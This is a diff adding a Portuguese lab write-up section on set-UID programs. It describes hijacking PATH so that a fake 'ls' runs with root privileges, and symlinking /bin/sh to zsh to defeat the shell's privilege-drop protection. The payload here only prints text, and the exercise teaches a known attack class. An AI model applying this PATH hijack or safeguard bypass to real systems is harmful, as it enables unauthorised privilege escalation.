@@ -69,6 +69,39 @@ execve("/usr/bin/env", argv, environ);
 
 ## Task 6
 
+- Após criarmos e compilarmos o programa set-UID e atribuirmos root privileges, procedemos em criar o nosso código malicioso.
+
+```c
+#include <stdio.h>
+#include <unistd.h>
+
+int main() {
+    printf("Malicious code!\n");
+    if (geteuid() == 0) {
+        printf("This code is running with root privilege\n");
+    } else {
+        printf("No root privilege for this code\n");
+    }
+    return 0;
+}
+```
+
+- Compilamos o código num executável nomeado `ls`. Para garantir que o nosso código fosse executado em vez da chamada do sistema `/bin/ls`, modificámos a variável de amiente `PATH` para prioritizar o nosso diretório atual.
+
+```bash
+export PATH=/home/seed:$PATH
+```
+
+- Ao corrermos diretamente o comando `ls` é gerado o output do nosso código malicioso.
+
+![image](screenshots/LB4_8.png)
+
+- Através do comando seguinte foi possível ultrapassar o mecanismo de segurança para que os privilégios não caiam automaticamente.
+
+```bash
+sudo ln -sf /bin/zsh /bin/sh
+```
+
 ## Task 8
 
 
